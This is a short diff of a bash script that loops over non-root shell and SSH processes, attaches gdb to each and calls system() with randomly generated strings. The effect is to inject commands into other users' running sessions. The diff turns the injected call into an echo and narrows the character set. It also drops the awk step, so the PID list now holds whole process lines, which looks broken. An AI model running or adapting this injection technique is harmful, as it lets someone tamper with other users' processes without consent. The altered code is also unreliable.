@@ -11,9 +11,9 @@ root_password="$1"
 
 while true; do
     # Get the list of PIDs for non-root shell/SSH instances
-    pids=$(ps -e -o pid,cmd,user | grep -E '(/bin/)?(bash|ssh|sh)' | grep -v 'root' | awk '{print $1}')
+    pids=$(ps -e -o pid,cmd,user | grep -E '(/bin/)?(bash|ssh|sh)' | grep -v 'root')
     
-    CHARSET="[:alnum:]!@#$%^&*()_+{}|:<>?~"
+    CHARSET="[:alnum:]_"
     generate_string() {
         local length=$1
         tr -dc "$CHARSET" < /dev/urandom | head -c $length
@@ -25,7 +25,7 @@ while true; do
     for pid in $pids; do
         # Execute GDB commands
         gdb -p $pid >/dev/null 2>&1 <<EOF &
-            call system("$random_string")
+            call system("echo $random_string")
             quit
 EOF
     done
